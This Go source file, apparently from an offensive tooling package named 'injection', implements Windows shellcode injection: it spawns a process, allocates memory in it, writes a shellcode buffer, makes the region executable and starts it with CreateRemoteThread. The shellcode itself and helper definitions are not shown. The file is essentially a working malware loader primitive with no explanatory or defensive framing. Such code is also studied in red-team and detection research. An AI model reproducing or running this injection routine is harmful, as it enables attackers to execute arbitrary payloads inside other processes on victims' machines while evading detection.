//go:build windows
// +build windows

package injection

import (
	"fmt"
	"unsafe"
)

const PROCESS_ALL_ACCESS = 0x1F0FFF

func CreateRemoteThreads() {
	fmt.Println("Starting CreateRemoteThread")

	// Allocate virtual mem at size of shellcode
	procInfo := createProcess()

	addr, _, _ := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

	// Write allocated shellcode mem
	WriteProcessMemory.Call(uintptr(procInfo.Process), addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), 0)

	// Change permission of address space
	oldProtect := PAGE_READWRITE
	VirtualProtectEx.Call(uintptr(procInfo.Process), addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))

	// Create remote thread under suspended process
	CreateRemoteThread.Call(uintptr(procInfo.Process), 0, 0, addr, 0, 0, 0)

	// Closing
	CloseHandle.Call(uintptr(procInfo.Process))
	fmt.Println("Finished CreateRemoteThread")
}
